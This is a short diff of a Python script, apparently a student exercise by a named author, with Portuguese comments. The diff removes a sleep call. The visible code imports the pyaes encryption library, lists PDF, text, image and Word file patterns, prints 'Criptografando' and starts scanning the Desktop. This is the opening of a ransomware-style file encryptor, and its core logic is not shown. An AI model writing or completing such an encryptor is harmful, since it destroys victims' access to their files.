@@ -14,13 +14,12 @@ Tomás Esteves Andrade - RM89081
 
 import os  # sistema operacional
 import glob  # busca os arquivos
-import time
 import pyaes  # biblioteca de criptografia aes
 from pathlib import Path  # pathlib utilizada para setar os caminhos
 
 lst_arqui = ['*.pdf', '*.txt', '*.jpg', '*.doc', ]
 print('Criptografando')
-time.sleep(3)
+
 
 # Entra no Desktop e faz a verificação
 try:
